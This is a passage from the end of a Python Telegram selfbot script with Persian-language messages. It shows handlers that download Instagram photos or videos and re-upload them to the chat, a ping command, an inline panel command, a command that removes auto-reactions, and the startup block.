                            supports_streaming=True,
                            reply_to_message_id=message.id
                        )
                    except Exception as upload_error:
                        await loading_msg.edit(f"❌ **خطا در آپلود:**\n`{str(upload_error)[:100]}`")
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    if thumbnail_path and os.path.exists(thumbnail_path):
                        os.remove(thumbnail_path)

                    await loading_msg.delete()

                except Exception as e:
                    await loading_msg.edit(f"❌ **خطا در پردازش ویدیو:**\n`{str(e)[:100]}`")
                    for temp_file in [f"temp_insta_{post_id}.mp4", f"temp_thumb_{post_id}.jpg"]:
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
            else:
                media_url = thumbnail_url

                if not media_url:
                    await loading_msg.edit("❌ **لینک عکس یافت نشد**")
                    return
                await loading_msg.edit("🖼️ **در حال دانلود عکس...**")
                try:
                    image_response = requests.get(media_url, timeout=30)

                    if image_response.status_code != 200:
                        await loading_msg.edit("❌ **خطا در دانلود عکس**")
                        return
                    temp_file = f"temp_insta_{post_id}.jpg"
                    with open(temp_file, 'wb') as f:
                        f.write(image_response.content)
                    await loading_msg.edit("📤 **در حال آپلود عکس...**")
                    try:
                        await client.send_photo(
                            chat_id=message.chat.id,
                            photo=temp_file,
                            caption=caption_text,
                            reply_to_message_id=message.id
                        )
                    except Exception as upload_error:
                        await loading_msg.edit(f"❌ **خطا در آپلود عکس:**\n`{str(upload_error)[:100]}`")
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    await loading_msg.delete()
                except Exception as e:
                    await loading_msg.edit(f"❌ **خطا در پردازش عکس:**\n`{str(e)[:100]}`")
                    if os.path.exists(f"temp_insta_{post_id}.jpg"):
                        os.remove(f"temp_insta_{post_id}.jpg")
        except requests.exceptions.Timeout:
            await loading_msg.edit("❌ **اتصال timeout شد**\nسرور پاسخ نداد.")
        except requests.exceptions.ConnectionError:
            await loading_msg.edit("❌ **خطا در اتصال**\nاینترنت خود را بررسی کنید.")
        except Exception as e:
            await loading_msg.edit(f"❌ **خطای غیرمنتظره:**\n`{str(e)[:150]}`")

    except Exception as e:
        await message.edit(f"❌ **خطای کلی:**\n`{str(e)[:150]}`")

@app.on_message(filters.me & filters.command("پینگ", prefixes=""))
async def ping_command(client: Client, message: Message):
    start_time = datetime.now()
    ping_msg = await message.edit("**⏳ در حال بررسی...**")
    end_time = datetime.now()

    ping_time = (end_time - start_time).microseconds / 1000
    await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")

@app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
async def panel_command(client, message: Message):
        results = await client.get_inline_bot_results(bot_username, "panel")

        if results and results.results:
            sent_message = await client.send_inline_bot_result(
                chat_id=message.chat.id,
                query_id=results.query_id,
                result_id=results.results[0].id
            )
            await message.delete()

        else:
            await message.reply_text("❌ پنل یافت نشد")
            await asyncio.sleep(3)
            await message.delete()

@app.on_message(filters.me & filters.regex(r'^حذف ریکت$'))
async def remove_reaction_command(client, message):
    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"

        if str(user_id) in auto_reactions:
            del auto_reactions[str(user_id)]
            save_reactions()
            await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
        else:
            await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
    else:
        await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید**")

if __name__ == "__main__":
    if USER_ID:
        print(f"✅ سلف‌بات برای کاربر {USER_ID} در حال اجرا...")
        print(f"📱 شماره: {PHONE}")
    else:
        print("⚠️ سلف‌بات در حالت معمولی اجرا شد")
    app.run()